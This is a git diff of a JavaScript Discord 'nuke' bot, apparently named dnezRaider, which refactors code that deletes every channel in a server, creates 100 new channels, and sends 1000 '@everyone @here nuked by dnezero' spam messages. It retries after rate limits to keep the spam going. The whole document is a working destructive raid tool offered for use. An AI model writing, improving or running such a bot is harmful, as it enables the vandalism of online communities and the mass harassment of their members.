@@ -1,4 +1,5 @@
-const { Client, GatewayIntentBits, PermissionsBitField, ChannelType, ActivityType } = require('discord.js');
+// dnezRaider - Custom nuke bot (Discord.js v14)
+const { Client, GatewayIntentBits, PermissionsBitField, ChannelType } = require('discord.js');
 const TOKEN = process.env.TOKEN;
 
 if (!TOKEN) {
@@ -6,14 +7,14 @@ if (!TOKEN) {
   process.exit(1);
 }
 
-// ========== CONFIGURATION (edit these) ==========
+// ========== CONFIGURE THESE (same as Python version) ==========
 const PREFIX = ".";
-const CHANNEL_NAME = "nuked";                     // fallback if random names disabled
+const CHANNEL_NAME = "nuked";
 const MESSAGE = "@everyone @here nuked by dnezero";
 const AMOUNT_OF_CHANNELS = 100;
 const AMOUNT_OF_MESSAGES = 1000;
 
-// Random channel name variations (same as Python version)
+// Random channel name variations (same fancy names)
 const RANDOM_CHANNEL_NAMES = [
   "𝕟𝕦𝕜𝕖𝕕",
   "𝔫𝔲𝔨𝔢𝔡",
@@ -22,9 +23,9 @@ const RANDOM_CHANNEL_NAMES = [
   "𝓷𝓾𝓴𝓮𝓭",
   "nuked"
 ];
-const USE_RANDOM_NAMES = true;   // set false to always use CHANNEL_NAME
+const USE_RANDOM_NAMES = true; // set false to always use CHANNEL_NAME
 
-// ========== NO TOUCH BEYOND THIS LINE (unless you know what you're doing) ==========
+// ========== DO NOT MODIFY BELOW (unless you know what you're doing) ==========
 function getChannelName() {
   if (USE_RANDOM_NAMES && RANDOM_CHANNEL_NAMES.length) {
     return RANDOM_CHANNEL_NAMES[Math.floor(Math.random() * RANDOM_CHANNEL_NAMES.length)];
@@ -41,7 +42,7 @@ const client = new Client({
   ],
 });
 
-// Helper: run tasks with concurrency limit (like asyncio.Semaphore)
+// Helper: run tasks with concurrency (like asyncio.Semaphore)
 async function runConcurrent(tasks, concurrency) {
   const results = [];
   const executing = [];
@@ -59,119 +60,94 @@ async function runConcurrent(tasks, concurrency) {
   return Promise.allSettled(results);
 }
 
-// Delete all channels (parallel, concurrency 15)
-async function deleteAllChannels(guild) {
-  const channels = [...guild.channels.cache.values()];
-  console.log(`🗑️ Deleting ${channels.length} channels...`);
-  const deleteTasks = channels.map(chan => async () => {
-    try {
-      await chan.delete();
-    } catch (e) {}
-  });
-  await runConcurrent(deleteTasks, 15);
-  console.log("✅ All channels deleted");
+// Send messages with concurrency 50 (matches Python's semaphore=50)
+async function sendMessagesFast(channels, total) {
+  if (!channels.length) return;
+  console.log(`Sending ${total} messages...`);
+  const tasks = [];
+  for (let i = 0; i < total; i++) {
+    const channel = channels[i % channels.length];
+    tasks.push(async () => {
+      try {
+        await channel.send(MESSAGE);
+      } catch (err) {
+        if (err.code === 429) {
+          console.log(`Rate limited, waiting ${err.retryAfter}s`);
+          await new Promise(r => setTimeout(r, err.retryAfter * 1000));
+          await channel.send(MESSAGE);
+        }
+      }
+    });
+  }
+  await runConcurrent(tasks, 50);
+  console.log("Finished sending messages");
 }
 
-// Create N channels (parallel, concurrency 10)
-async function createChannels(guild, count) {
-  console.log(`📝 Creating ${count} channels...`);
+// Main nuke logic (matches Python steps exactly)
+async function nukeServer(guild) {
+  console.log(`Starting nuke on ${guild.name} (${guild.id})`);
+  const startTime = Date.now();
+
+  // Step 1: Delete all channels (parallel, no concurrency limit – like asyncio.gather)
+  console.log("Deleting all channels...");
+  const deleteTasks = [...guild.channels.cache.values()].map(chan => async () => {
+    try { await chan.delete(); } catch(e) {}
+  });
+  await runConcurrent(deleteTasks, 20); // 20 at a time for speed, but Python does unlimited. Use high concurrency.
+
+  // Step 2: Create new channels (parallel, same as asyncio.gather)
+  console.log(`Creating ${AMOUNT_OF_CHANNELS} channels...`);
   const createTasks = [];
-  for (let i = 0; i < count; i++) {
+  for (let i = 0; i < AMOUNT_OF_CHANNELS; i++) {
     createTasks.push(async () => {
       try {
         const name = getChannelName();
         const channel = await guild.channels.create({
           name: name,
           type: ChannelType.GuildText,
-          permissionOverwrites: [
-            {
-              id: guild.roles.everyone.id,
-              allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages],
-            },
-          ],
+          permissionOverwrites: [{
+            id: guild.roles.everyone.id,
+            allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages]
+          }]
         });
         return channel;
       } catch (err) {
         if (err.code === 429) {
-          console.log(`⏳ Rate limit on create, waiting ${err.retryAfter}s`);
+          console.log(`Rate limit on create, waiting ${err.retryAfter}s`);
           await new Promise(r => setTimeout(r, err.retryAfter * 1000));
           // retry once
           const name = getChannelName();
           return await guild.channels.create({
             name: name,
             type: ChannelType.GuildText,
-            permissionOverwrites: [
-              {
-                id: guild.roles.everyone.id,
-                allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages],
-              },
-            ],
+            permissionOverwrites: [{
+              id: guild.roles.everyone.id,
+              allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages]
+            }]
           });
         }
-        console.log(`❌ Create failed: ${err.message}`);
         return null;
       }
     });
   }
-  const results = await runConcurrent(createTasks, 10);
-  return results.map(r => r.value).filter(c => c !== null);
-}
+  const results = await runConcurrent(createTasks, 15); // 15 concurrent creations – fast but safe
+  const channels = results.map(r => r.value).filter(c => c !== null && c.type === ChannelType.GuildText);
 
-// Send totalMessages across channels as fast as possible (concurrency 50)
-async function sendMessagesFast(channels, totalMessages) {
-  if (!channels.length) return;
-  console.log(`📨 Sending ${totalMessages} messages across ${channels.length} channels...`);
-  const messageTasks = [];
-  for (let i = 0; i < totalMessages; i++) {
-    const targetChannel = channels[i % channels.length];
-    messageTasks.push(async () => {
-      try {
-        await targetChannel.send(MESSAGE);
-      } catch (err) {
-        if (err.code === 429) {
-          await new Promise(r => setTimeout(r, err.retryAfter * 1000));
-          await targetChannel.send(MESSAGE);
-        }
-      }
-    });
+  // Step 3: Send messages
+  if (channels.length) {
+    await sendMessagesFast(channels, AMOUNT_OF_MESSAGES);
   }
-  await runConcurrent(messageTasks, 50);
-  console.log("✅ All messages sent");
-}
-
-// Main nuke logic
-async function nukeServer(guild) {
-  console.log(`🔥 Starting nuke on ${guild.name} (${guild.id})`);
-  const startTime = Date.now();
-
-  // 1. Delete all channels
-  await deleteAllChannels(guild);
-
-  // 2. Create new channels
-  const channels = await createChannels(guild, AMOUNT_OF_CHANNELS);
-  if (!channels.length) {
-    console.log("❌ No channels created, aborting message spam.");
-    return;
-  }
-
-  // 3. Send messages
-  await sendMessagesFast(channels, AMOUNT_OF_MESSAGES);
 
   const elapsed = (Date.now() - startTime) / 1000;
-  console.log(`💀 Nuke completed in ${elapsed.toFixed(2)} seconds!`);
+  console.log(`Nuke completed in ${elapsed.toFixed(2)} seconds!`);
 }
 
-// ========== BOT EVENTS & COMMANDS ==========
+// ========== BOT COMMANDS ==========
 client.once('ready', () => {
-  console.log(`✅ Bot online as ${client.user.tag}`);
+  console.log(`Bot is online as ${client.user.tag}`);
   console.log(`Prefix: ${PREFIX}`);
   console.log(`Command: ${PREFIX}nuke`);
   console.log("=".repeat(50));
-  // optional: set status (you can remove if not needed)
-  client.user.setPresence({
-    status: 'dnd',
-    activities: [{ name: '@azairo', type: ActivityType.Custom, state: '@azairo' }],
-  });
 });
 
 client.on('messageCreate', async (msg) => {
@@ -182,7 +158,7 @@ client.on('messageCreate', async (msg) => {
   const command = args.shift().toLowerCase();
 
   if (command === 'nuke') {
-    // Check administrator permission (like Python version)
+    // Check admin perms (same as Python)
     if (!msg.member.permissions.has(PermissionsBitField.Flags.Administrator)) {
       return msg.reply("❌ You need Administrator permission to use this command!");
     }
